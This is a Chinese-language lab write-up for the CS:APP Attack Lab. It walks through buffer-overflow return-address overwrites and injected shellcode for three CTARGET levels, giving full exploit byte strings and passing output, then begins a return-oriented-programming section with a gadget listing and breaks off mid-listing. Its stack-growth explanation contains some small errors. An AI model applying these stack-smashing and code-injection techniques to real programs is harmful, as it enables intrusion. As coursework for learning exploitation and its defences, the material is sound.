<h3 id="A-Hex2raw-工具讲解"><a href="#A-Hex2raw-工具讲解" class="headerlink" title="A:Hex2raw 工具讲解"></a>A:Hex2raw 工具讲解</h3><p>由 <code>in.txt</code>文件转为二进制文件<code>out</code>需要执行代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;hex2raw &lt;in.txt &gt; out</span><br></pre></td></tr></table></figure>
<h3 id="B-ByteCodes生成"><a href="#B-ByteCodes生成" class="headerlink" title="B:ByteCodes生成"></a>B:ByteCodes生成</h3><p>众所周知, 汇编代码是与机器的字节码一一对应的, 那么如果由汇编代码转化为字节编码呢? 我们只需要先撰写汇编代码文件 <code>example.s</code> , 使用 gcc 将其编译, 再将其反编译为中间文件即可.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -c example.s</span><br><span class="line">objdump -d example.o &gt; example.d</span><br></pre></td></tr></table></figure>
<p>打开 example.d 即可看见对应的机器码了.</p>
<h2 id="题解-CTARGET"><a href="#题解-CTARGET" class="headerlink" title="题解: CTARGET"></a>题解: CTARGET</h2><p>我们首先明确一下我们要干什么. 假设你已经阅读过教材 3.10.3 小结, 你应该知道我们的目标是利用缓冲区溢出来使得函数返回时返回至另外的,出乎意料的, 由我们(攻击者)提供的函数地址上. 基本的原理不在这里多说.</p>
<p>下面的叙述均基于 CTARGET  为背景.</p>
<h3 id="Level1"><a href="#Level1" class="headerlink" title="Level1"></a><strong>Level1</strong></h3><h4 id="test函数"><a href="#test函数" class="headerlink" title="test函数"></a>test函数</h4><p>这个函数是我们将攻击的代码. 我们通过 <code>getbuf</code> 函数输入一串字符, 理论上正常返回时会返回整型 <code>1</code> 储存在 <code>val</code>中 并打印, 退出. </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test 函数的C语言表述</span></span><br><span class="line"><span class="number">1</span><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> val;</span><br><span class="line">	val = getbuf();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"No exploit. Getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面来观察汇编代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;test 函数的汇编表述</span><br><span class="line">Dump of assembler code for function test:</span><br><span class="line">    0x0000000000401968 &lt;+0&gt;:	sub    $0x8,%rsp</span><br><span class="line">    0x000000000040196c &lt;+4&gt;:	mov    $0x0,%eax</span><br><span class="line">    0x0000000000401971 &lt;+9&gt;:	callq  0x4017a8 &lt;getbuf&gt;</span><br><span class="line">    0x0000000000401976 &lt;+14&gt;:	mov    %eax,%edx</span><br><span class="line">    0x0000000000401978 &lt;+16&gt;:	mov    $0x403188,%esi</span><br><span class="line">    0x000000000040197d &lt;+21&gt;:	mov    $0x1,%edi</span><br><span class="line">    0x0000000000401982 &lt;+26&gt;:	mov    $0x0,%eax</span><br><span class="line">    0x0000000000401987 &lt;+31&gt;:	callq  0x400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">    0x000000000040198c &lt;+36&gt;:	add    $0x8,%rsp</span><br><span class="line">    0x0000000000401990 &lt;+40&gt;:	retq</span><br></pre></td></tr></table></figure>
<p>我们注意&lt;+9&gt; 这一行, <code>callq</code> 函数的操作对象是一个地址, 目前这个地址是指向到 <code>getbuf</code>函数</p>
<p>在<code>getbuf</code>结束后, 应当返回到下一个地址, 即0x401976 , 称为原地址. </p>
<blockquote>
<p>事实上, 当我们在使用<code>callq</code>某个函数的时候, 下一条指令的地址(即上面提到的原地址) 会被push进栈中. 换言之, 当被调用函数结束, 执行 <code>retq</code>指令时, 是读取栈顶的元素作为跳转的地址. 在正常情况下就会跳转至原地址, 程序继续运行.</p>
</blockquote>
<p>我们的目标就是替换掉栈顶的原地址, 将其修改为我们期望转到的 <code>touch1</code>函数的开始地址, 称为目标地址.</p>
<p>于是任务变成了:</p>
<ol>
<li>找到堆栈中原地址的储存位置</li>
<li>确定目标地址的地址</li>
<li>将原地址替换为目标地址</li>
</ol>
<h4 id="getbuf-函数"><a href="#getbuf-函数" class="headerlink" title="getbuf 函数"></a>getbuf 函数</h4><p>我们可以看到它的C代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//getbuf 函数的C语言表述</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[BUFFER_SIZE];</span><br><span class="line">	GETs(buf);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先的问题是, 我们需要知道这个缓冲区设置有多长? .我们照例查看其汇编代码:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;getbuf()</span><br><span class="line">Dump of assembler code for function getbuf:</span><br><span class="line">   0x00000000004017a8 &lt;+0&gt;:	sub    $0x28,%rsp</span><br><span class="line">   0x00000000004017ac &lt;+4&gt;:	mov    %rsp,%rdi</span><br><span class="line">   0x00000000004017af &lt;+7&gt;:	callq  0x401a40 &lt;Gets&gt;</span><br><span class="line">   0x00000000004017b4 &lt;+12&gt;:	mov    $0x1,%eax</span><br><span class="line">   0x00000000004017b9 &lt;+17&gt;:	add    $0x28,%rsp</span><br><span class="line">   0x00000000004017bd &lt;+21&gt;:	retq</span><br></pre></td></tr></table></figure>
<p>我们注意到在代码开始处, 堆栈扩充了 0x28 个大小. </p>
<p>这说明缓冲区大小即为0x28</p>
<blockquote>
<p>BUFF_SIZE 大小应该是与缓冲区是两个概念.</p>
<p>例如 教材3.10小节的代码. 实际上分配的字符数组为 <code>buf[8]</code>, 但是体现在汇编代码中就变成了<code>subq $24,%rsp</code> , 此处SIZE应该是8 , 而缓冲区大小则是 0x24.</p>
</blockquote>
<p>在整个过程中栈的变化是这样的:</p>
<blockquote>
<p>假设在test函数的<code>callq</code>语句调用之前, 栈顶指针<code>$rsp</code> 为 0x666600, 当前执行语句 <code>$rip</code> 为0x401971</p>
<ol>
<li>调用<code>callq</code>语句, 将下一条语句( 原地址, 0x0401976) 推入栈中, 即0x666600处, 栈指针 <code>$rsp</code>  变为0x666601</li>
<li>进入<code>getbuf</code>语句, 在<code>0x4017a8</code>处分配了0x28个栈, 此时栈顶指针为0x666629</li>
<li><code>getbuf</code>函数正常运行. 直到读入过量字符数组数据时, 将0x666600处的原地址覆盖为目标地址 ,此时栈顶依旧为0x666629</li>
<li>继续运行至0x4017b9处, 收回栈空间, 此时栈顶又变为0x666601</li>
<li><code>retq</code>语句, 取栈顶元素0x666600处的地址 (已经被覆盖成目标地址了) 并跳转. 即达到我们的目的.</li>
</ol>
<p>嗯……应该不会有人疑惑上一步栈顶不是0x666601为什么取0x666600的元素吧…</p>
<p>因为栈指针是指向栈顶下一个地址的…</p>
</blockquote>
<p>不妨使用gdb的查看指令检验一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;在 +12 设置一个断点</span><br><span class="line">&#x2F;&#x2F;事先输入的字符串为 &quot;abcdef&quot;</span><br><span class="line">(gdb) print (char*) ($rsp)</span><br><span class="line">$1 &#x3D; 0x5561dc78 &quot;abcdef&quot;</span><br><span class="line">&#x2F;&#x2F;可以看出, 堆栈的起始位置即储存了输入的字符串</span><br><span class="line"></span><br><span class="line">(gdb) x&#x2F;a ($rsp+0x28) </span><br><span class="line">0x5561dca0:	0x401976 &lt;test+14&gt;</span><br><span class="line">&#x2F;&#x2F;可以看出, 当我们试图查看 ($rsp+0x28) 储存的地址时, 发现正好时test+14的地址, 也就是我们的原地址.</span><br></pre></td></tr></table></figure>
<p>那么我们现在只需要使用目标地址替换原地址即可.</p>
<h4 id="touch1-函数"><a href="#touch1-函数" class="headerlink" title="touch1 函数"></a>touch1 函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;touch1 反汇编</span><br><span class="line">Dump of assembler code for function touch1:</span><br><span class="line">   0x00000000004017c0 &lt;+0&gt;:	sub    $0x8,%rsp</span><br><span class="line">   0x00000000004017c4 &lt;+4&gt;:	movl   $0x1,0x202d0e(%rip)        # 0x6044dc &lt;vlevel&gt;</span><br><span class="line">   0x00000000004017ce &lt;+14&gt;:	mov    $0x4030c5,%edi</span><br><span class="line">   0x00000000004017d3 &lt;+19&gt;:	callq  0x400cc0 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000004017d8 &lt;+24&gt;:	mov    $0x1,%edi</span><br><span class="line">   0x00000000004017dd &lt;+29&gt;:	callq  0x401c8d &lt;validate&gt;</span><br><span class="line">   0x00000000004017e2 &lt;+34&gt;:	mov    $0x0,%edi</span><br><span class="line">   0x00000000004017e7 &lt;+39&gt;:	callq  0x400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
<p>显然目标地址就是 <code>0x4017c0</code></p>
<p>因此, 我们应当输入的数字如下:</p>
<blockquote>
<p>00 00 00 00 00 00 00 00 00 00 </p>
<p>00 00 00 00 00 00 00 00 00 00 </p>
<p>00 00 00 00 00 00 00 00 00 00 </p>
<p>00 00 00 00 00 00 00 00 00 00 </p>
<p>c0 17 40 00 00 00 00 00 00 00 </p>
</blockquote>
<p>上面的内容不能直接在<code>ctarget</code>运行时输入, 而要使用 <code>Hex2raw</code>工具处理. 具体请参看上面的  <code>Hex2raw</code> 讲解部分.</p>
<p>我们将上述材料存储在文件<code>in.txt</code>内, 并使用 <code>Hex2raw</code>工具将其转化为 二进制 文件并输入. </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;shell输入</span><br><span class="line">.&#x2F;hex2raw  &lt;in.txt&gt; out</span><br><span class="line">.&#x2F;ctarget -i out -q</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;shell输出</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch1!: You called touch1()</span><br><span class="line">Valid solution for level 1 with target ctarget</span><br></pre></td></tr></table></figure>
<p>说明我们已经过了第一关</p>
<hr>
<h3 id="Level2"><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h3><p>第二题的背景依旧是test函数. 除了将getbuf函数中的返回地址改为touch2函数的地址外, 还需要将注入的字符串作为代码运行. 相对复杂.</p>
<p>我们先来看touch2函数</p>
<h4 id="touch2-函数"><a href="#touch2-函数" class="headerlink" title="touch2 函数"></a>touch2 函数</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//touch2 函数的C语言表述</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (val == cookie)</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Touch2!: You called touch2(0x%.8x)\n"</span>, val); </span><br><span class="line">      validate(<span class="number">2</span>);</span><br><span class="line">   &#125;<span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="built_in">printf</span>(<span class="string">"Misfire: You called touch2(0x%.8x)\n"</span>,val); </span><br><span class="line">      fail(<span class="number">2</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> 可见, touch2函数中会进行参数val与你的cookie进行比较, 当相同时才认为你通关. 接着看touch2的汇编代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;touch2 函数的汇编表述</span><br><span class="line">Dump of assembler code for function touch2:</span><br><span class="line">    0x00000000004017ec &lt;+0&gt;:	sub    $0x8,%rsp</span><br><span class="line">    0x00000000004017f0 &lt;+4&gt;:	mov    %edi,%edx</span><br><span class="line">    0x00000000004017f2 &lt;+6&gt;:	movl   $0x2,0x202ce0(%rip)        # 0x6044dc &lt;vlevel&gt;</span><br><span class="line">    0x00000000004017fc &lt;+16&gt;:	cmp    0x202ce2(%rip),%edi        # 0x6044e4 &lt;cookie&gt;</span><br><span class="line">    0x0000000000401802 &lt;+22&gt;:	jne    0x401824 &lt;touch2+56&gt;</span><br><span class="line">    0x0000000000401804 &lt;+24&gt;:	mov    $0x4030e8,%esi</span><br><span class="line">    0x0000000000401809 &lt;+29&gt;:	mov    $0x1,%edi</span><br><span class="line">    0x000000000040180e &lt;+34&gt;:	mov    $0x0,%eax</span><br><span class="line">    0x0000000000401813 &lt;+39&gt;:	callq  0x400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">    0x0000000000401818 &lt;+44&gt;:	mov    $0x2,%edi</span><br><span class="line">    0x000000000040181d &lt;+49&gt;:	callq  0x401c8d &lt;validate&gt;</span><br><span class="line">    0x0000000000401822 &lt;+54&gt;:	jmp    0x401842 &lt;touch2+86&gt;</span><br><span class="line">    0x0000000000401824 &lt;+56&gt;:	mov    $0x403110,%esi</span><br><span class="line">    0x0000000000401829 &lt;+61&gt;:	mov    $0x1,%edi</span><br><span class="line">    0x000000000040182e &lt;+66&gt;:	mov    $0x0,%eax</span><br><span class="line">    0x0000000000401833 &lt;+71&gt;:	callq  0x400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">    0x0000000000401838 &lt;+76&gt;:	mov    $0x2,%edi</span><br><span class="line">    0x000000000040183d &lt;+81&gt;:	callq  0x401d4f &lt;fail&gt;</span><br><span class="line">    0x0000000000401842 &lt;+86&gt;:	mov    $0x0,%edi</span><br><span class="line">    0x0000000000401847 &lt;+91&gt;:	callq  0x400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
<p>这里注意一下 +4 行. <code>%edi</code> 还记得吗? 是默认的传入函数的第一个参数. 也就是说, 我们要在调用touch2之前, 将 <code>%edi</code>寄存器的值设置为我们的cookie. 如果只是类似上一题中的代码跳转的话, 我们没有办法对寄存器进行实际的修改, 所以我们需要将自己的代码注入进去后能够实际运行它们.</p>
<h4 id="注入代码的执行"><a href="#注入代码的执行" class="headerlink" title="注入代码的执行"></a>注入代码的执行</h4><p>具体的操作为: getbuf 结束后, 返回地址指向栈中. (准确的说是我们注入的字符数组) 使得我们注入的字符被解析成汇编代码并被运行. 在这段注入的代码末尾再跳转进touch2函数.</p>
<p>也就是说, 我们注入的字符需要实际上实现下面这段汇编代码的功能.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;注入代码需要实现的功能</span><br><span class="line">&#x2F;&#x2F;这些保存在 touch2_tmp.s 中</span><br><span class="line">mov $0x59b997fa,%rdi		&#x2F;&#x2F;将cookie写入%edi寄存器</span><br><span class="line">pushq $0x4017ec				&#x2F;&#x2F;将touch2首地址推入栈顶</span><br><span class="line">retq						&#x2F;&#x2F;retq在执行时,将跳转touch2函数</span><br></pre></td></tr></table></figure>
<p>通过使用Byte Codes生成器(参看对应的讲解), 我们可以拿到这些ByteCode:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -c touch2_tmp.s 			&#x2F;&#x2F;使用汇编器生成二进制的可重定位目标程序touch2_tmp.o</span><br><span class="line">objdump -d touch2_tmp.o &gt;touch2_tmp.d	&#x2F;&#x2F;使用objdump将目标文件得到中间文件</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;下面是中间文件touch2_tmp.d中的内容,有精间</span><br><span class="line">0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi</span><br><span class="line">7:   68 ec 17 40 00          pushq  $0x4017ec</span><br><span class="line">c:   c3                      retq</span><br></pre></td></tr></table></figure>
<h4 id="最后的小处理"><a href="#最后的小处理" class="headerlink" title="最后的小处理"></a>最后的小处理</h4><p>我们还需要对最终的in2文件进行小小的处理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;这是 in2.txt 文件中的内容</span><br><span class="line">48 c7 c7 fa 97 b9 59</span><br><span class="line">68 ec 17 40 00</span><br><span class="line">c3</span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 </span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
<p>上述代码的前3行就是我们拿到的 touch2_tmp.d 中的ByteCode</p>
<p>4-7行是为了填充缓冲区, 事实上1-7行一共有 0x28   个字符  <span style="background-color: #252525">不信你数数</span></p>
<p>第8行是将getbuf函数的返回地址覆盖为第1行的地址 0x5561dc78, 这个地址是很容易拿到的.</p>
<p><strong>大功告成</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;shell输入</span><br><span class="line">.&#x2F;hex2raw &lt;in2.txt&gt; out2</span><br><span class="line">.&#x2F;ctarget -i out2 -q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;shell输出</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
<p>第二关就过啦~~</p>
<hr>
<h3 id="Level3"><a href="#Level3" class="headerlink" title="Level3"></a>Level3</h3><p>第三题的背景依旧是test函数. 表面逻辑: 在getbuf 函数结束后跳转至 touch3 函数. 并且在touch3函数中需要调用hexmatch函数, 后者是这么一个函数: 传入一个地址, 并读取该地址存储的字符串, 这个字符串应该是与cookie相同. (不包括前缀0x).</p>
<p>整体的思路类似Level2, getbuf 函数结束后跳转至缓冲区中注入的代码. 在注入代码中将参数1设置为字符串的地址, 并且注入代码段结束后跳转至touch3函数. </p>
<p>在retq语句跳转至其他函数我们已经的轻车熟路了, 这里直接给出touch3的首地址: <code>0x4018fa</code>, 我们需要在注入代码中实现该地址的入栈, 这样注入代码的返回会读取栈顶, 从而跳转至touch3.</p>
<p>基本分析完毕, 现在需要考虑的只剩:</p>
<ol>
<li>注入什么字符串?</li>
<li>将字符串注入在哪?</li>
</ol>
<h4 id="字符串注入内容"><a href="#字符串注入内容" class="headerlink" title="字符串注入内容"></a>字符串注入内容</h4><p>我们需要将cookie转化为字符串, 这里需要注意两点: </p>
<ol>
<li>每个字符占一个字节. 使用ASCII码表示</li>
<li>字符串的结尾需要使用<code>\0</code>结尾</li>
</ol>
<p>在Linux平台下, 执行<code>man ascii</code>命令可以获取ASCII码表, 对应的编码很容易对照获得</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;cookie 的ASCII表述</span><br><span class="line">35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>
<h4 id="字符串注入位置"><a href="#字符串注入位置" class="headerlink" title="字符串注入位置"></a>字符串注入位置</h4><p>这里比较坑. </p>
<p>我们看一下 hexmatch 函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//hexmatch C语言表述</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span>&#123;</span><br><span class="line">   <span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">   <span class="keyword">char</span> *s = cbuf + <span class="built_in">random</span>()%<span class="number">100</span>;</span><br><span class="line">   <span class="built_in">sprintf</span>(s, <span class="string">"%.8x"</span>, val);</span><br><span class="line">   <span class="keyword">return</span> strncmo(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当我们在对缓冲区写入的时候, 实际上的可以写入的地方包括: test函数的栈帧, getbuf函数的栈帧, 以及其他地方. 但是当我们从getbuf函数返回的时候, 原本的getbuf栈帧被回收(虽然里面的数据没有清掉) , 并且在之后分配在了hexmatch 的栈帧上. </p>
<p>那么栈的分配与回收仅仅是栈指针的变动, 可不可以将数据依旧储存在栈帧里面呢? 很遗憾也是不行的. 在hexmatch函数中划分了一个长度为110 的char数组, 并且将s字符串的地址设置为其中的的任意处, 这就使得你原本储存的数据<strong>有可能</strong>被覆盖掉.</p>
<p>于是, 我们选择将数据写入test函数的栈帧中.</p>
<p><strong>存疑</strong>: 可不可以将数据写入栈的其他位置? 比如栈 120 处.</p>
<h4 id="字节代码的编写"><a href="#字节代码的编写" class="headerlink" title="字节代码的编写"></a>字节代码的编写</h4><p>根据以上分析, 我们已经能够写出需要注入的部分</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov   $0x5561dca8,%rdi      &#x2F;&#x2F;将字符串地址推入rdi 此条地址(执行代码的首地址)为0x5561dc78</span><br><span class="line">pushq $0x4018fa             &#x2F;&#x2F;touch3地址</span><br><span class="line">retq</span><br><span class="line">...补全缓冲区 28</span><br><span class="line">...缓冲区内的执行代码的首地址 (8位地址)0x5561dc78</span><br><span class="line">...储存cookie, 写入语句 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>
<p>上述1-3行, 是将会执行的代码, 包括将字符串地址设为参数1, 将touch3地址入栈, 以及返回touch3</p>
<p>第4行是填满缓冲区的, 1-4行总计28字节</p>
<p>缓冲区后属于test的栈帧, 最底处保存的是getbuf的retq返回地址, 指向执行代码的首地址.</p>
<p>test更往后的地方就是我们储存cookie的地方. 此处的地址即为字符串地址0x0x5561dca8</p>
<h4 id="最终答案"><a href="#最终答案" class="headerlink" title="最终答案"></a>最终答案</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55</span><br><span class="line">68 fa 18 40 00</span><br><span class="line">c3</span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00 </span><br><span class="line">35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>
<p>1-3: 执行代码</p>
<p>4-7: 填充</p>
<p>8: 执行代码的首地址</p>
<p>9: 字符串地址的首地址</p>
<p><strong>大功告成</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;shell输入</span><br><span class="line">.&#x2F;hex2raw &lt;in3.txt&gt; out3</span><br><span class="line">.&#x2F;ctarget -i out3 -q</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;shell输出</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch3!: You called touch3(&quot;59b997fa&quot;)</span><br><span class="line">Valid solution for level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="题解-RTARGET"><a href="#题解-RTARGET" class="headerlink" title="题解: RTARGET"></a>题解: RTARGET</h2><p>我们在上一部分利用了缓冲区溢出, 从而劫持返回地址, 将地址返回至我们期望的地址. 除此之外我们还将代码注入进缓冲区, 并通过返回地址执行这段代码. 我们还注意到了在程序的运行的过程中可能存在的内存覆盖, 因此我们规避并选取适当的地方来储存数据.</p>
<p>上述手段被称为 <strong>代码注入攻击</strong> (code injection attack) 已经是”莫里斯蠕虫”时代的手法了, 现代编译器使用 <strong>地址空间布局随机化</strong>(Address space layout randomization, ASLR), 栈空间代码禁止执行(增加 “可执行” 的权限位) , 与<strong>金丝雀</strong>(Canary) 等多种手段防范代码注入攻击. 对于前两种防御手段, 黑客们使用了名为 <strong>面向返回编程</strong> (Return-oriented programming, ROP) 的技巧, 仅仅使用原有代码的部分碎片拼接成待执行的代码. </p>
<p>本题将学习ROP来进行代码攻击. 在此之前, 有必要讲解 <em>gadgetfarm</em></p>
<h3 id="Gadget-Farm-的使用"><a href="#Gadget-Farm-的使用" class="headerlink" title="Gadget Farm 的使用"></a>Gadget Farm 的使用</h3><p>在rtagret中包括了一系列函数,  里面包括的一系列字节码将被我们作为碎片(gadget) 进行拼接并使用. 这些函数被称为farm函数</p>
<p>我们可以拿到 farm 中的小gadgets:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">objdump rtarget &gt; farm-dump.txt</span><br></pre></td></tr></table></figure>
<p> 得到的文件中只有一部分是我们需要的, 删去不必要的代码后, 最终拿到:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rtarget:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">Disassembly of section .init:</span><br><span class="line"></span><br><span class="line">0000000000401994 &lt;start_farm&gt;:</span><br><span class="line">  401994:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  401999:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">000000000040199a &lt;getval_142&gt;:</span><br><span class="line">  40199a:	b8 fb 78 90 90       	mov    $0x909078fb,%eax</span><br><span class="line">  40199f:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019ae &lt;setval_237&gt;:</span><br><span class="line">  4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)</span><br><span class="line">  4019b4:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019b5 &lt;setval_424&gt;:</span><br><span class="line">  4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)</span><br><span class="line">  4019bb:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019bc &lt;setval_470&gt;:</span><br><span class="line">  4019bc:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)</span><br><span class="line">  4019c2:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)</span><br><span class="line">  4019c9:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019ca &lt;getval_280&gt;:</span><br><span class="line">  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax</span><br><span class="line">  4019cf:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019d0 &lt;mid_farm&gt;:</span><br><span class="line">  4019d0:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4019d5:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019db &lt;getval_481&gt;:</span><br><span class="line">  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax</span><br><span class="line">  4019e0:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019e1 &lt;setval_296&gt;:</span><br><span class="line">  4019e1:	c7 07 99 d1 90 90    	movl   $0x9090d199,(%rdi)</span><br><span class="line">  4019e7:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019e8 &lt;addval_113&gt;:</span><br><span class="line">  4019e8:	8d 87 89 ce 78 c9    	lea    -0x36873177(%rdi),%eax</span><br><span class="line">  4019ee:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019ef &lt;addval_490&gt;:</span><br><span class="line">  4019ef:	8d 87 8d d1 20 db    	lea    -0x24df2e73(%rdi),%eax</span><br><span class="line">  4019f5:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019f6 &lt;getval_226&gt;:</span><br><span class="line">  4019f6:	b8 89 d1 48 c0       	mov    $0xc048d189,%eax</span><br><span class="line">  4019fb:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019fc &lt;setval_384&gt;:</span><br><span class="line">  4019fc:	c7 07 81 d1 84 c0    	movl   $0xc084d181,(%rdi)</span><br><span class="line">  401a02:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a03 &lt;addval_190&gt;:</span><br><span class="line">  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax</span><br><span class="line">  401a09:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a0a &lt;setval_276&gt;:</span><br><span class="line">  401a0a:	c7 07 88 c2 08 c9    	movl   $0xc908c288,(%rdi)</span><br><span class="line">  401a10:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a11 &lt;addval_436&gt;:</span><br><span class="line">  401a11:	8d 87 89 ce 90 90    	lea    